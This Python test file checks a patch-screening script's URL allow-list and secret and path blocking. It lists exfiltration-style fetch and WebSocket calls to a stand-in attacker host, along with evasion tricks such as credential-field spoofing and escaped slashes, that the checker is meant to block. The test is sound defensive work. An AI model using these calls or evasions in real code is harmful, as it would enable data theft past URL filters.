"""check_patch.py 網址白名單測試（健檢 2026-11-01；Codex 審查 PR #137 指出的繞法都要擋下）。
用法：python3 tool/change_request/check_patch_test.py
用程式拼出來的網址（例如 '//' + host）比對擋不住，靠預覽版的 CSP connect-src（mark_preview.py）擋。"""
import importlib.util
import pathlib
import sys

spec = importlib.util.spec_from_file_location("cp", pathlib.Path(__file__).with_name("check_patch.py"))
cp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cp)


def blocked(line: str) -> bool:
    return any(not cp.host_ok(h) for h in cp.hosts_in(line))


MUST_BLOCK = [
    "fetch('//evil.com/collect')",                         # 沒有 scheme
    "fetch('https://github.com@evil.com/x')",              # 帳密欄位偽裝
    "fetch('https://user:pw@evil.com')",
    "fetch('HTTPS://EVIL.com')",
    "fetch('https://evil.com:443')",
    "fetch('https:\\/\\/evil.com')",                       # JS 跳脫
    "fetch('https:\\x2f\\x2fevil.com')",
    "new WebSocket('ws://evil.com')",
    "fetch('https://attacker.supabase.co/rest')",          # 別人的 Supabase 專案
    "fetch('https://yfulcyeoqavqarpfnznw.supabase.co.evil.com')",
    "fetch('https://1.2.3.4/x')",
]
MUST_PASS = [
    "final u = 'https://yfulcyeoqavqarpfnznw.supabase.co/rest/v1';",
    "// 這是註解：看 //TODO",
    "/// 文件註解",
    "sc.src = 'https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js';",
    "url: 'https://dwr6k2wbzw-dot.github.io/yincheng-app/book/yincheng/'",
    "final x = a // b;",
    "link: 'https://maps.app.goo.gl/abc'",
]

bad = [f"沒擋到：{l}" for l in MUST_BLOCK if not blocked(l)] + [f"誤擋：{l}" for l in MUST_PASS if blocked(l)]
print("\n".join(bad) if bad else f"check_patch 網址檢查：{len(MUST_BLOCK)} 個要擋、{len(MUST_PASS)} 個要放行，全部正確")

# 整支 main() 實際跑一次（Codex 審查 PR #137：只測 helper 時，main() 用到被刪掉的 SECRET 也沒發現）：
# 在暫存 git repo 放好一筆修改、git add，照 claude-change.yml 的方式執行 check_patch.py，看結束碼
import os
import subprocess
import tempfile

SCRIPT = pathlib.Path(__file__).with_name("check_patch.py").resolve()


def run_case(files: dict) -> tuple:
    with tempfile.TemporaryDirectory() as d:
        g = lambda *a: subprocess.run(["git", *a], cwd=d, check=True, capture_output=True)
        g("init", "-q")
        g("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "base")
        for path, body in files.items():
            f = pathlib.Path(d, path)
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(body, encoding="utf-8")
        g("add", "-A")
        r = subprocess.run([sys.executable, str(SCRIPT)], cwd=d, capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()


FAKE_KEY = "sk-" + "ant-" + "A" * 24  # 拆開寫，避免這個測試檔本身被金鑰掃描擋下
MAIN_CASES = [
    ("一般修改（加註解）放行", {"lib/main.dart": "// 老闆想把按鈕改成金色\nvoid main() {}\n"}, 0),
    ("用到自己的 Supabase 放行", {"lib/x.dart": "const u = 'https://yfulcyeoqavqarpfnznw.supabase.co/rest/v1';\n"}, 0),
    ("夾帶金鑰擋下", {"lib/x.dart": f"const k = '{FAKE_KEY}';\n"}, 1),
    ("外部網址擋下", {"lib/x.dart": "final u = '//evil.com/c';\n"}, 1),
    ("改連線設定擋下", {"lib/config.dart": "// x\n"}, 1),
    ("改到不允許的資料夾擋下", {".github/workflows/x.yml": "x\n"}, 1),
]
for name, files, want in MAIN_CASES:
    code, out = run_case(files)
    ok = (code == 0) == (want == 0) and "Traceback" not in out
    print(("  ✓ " if ok else "  ✗ ") + f"{name}（結束碼 {code}）" + ("" if ok else f"：{out[-300:]}"))
    if not ok:
        bad.append(name)

sys.exit(1 if bad else 0)
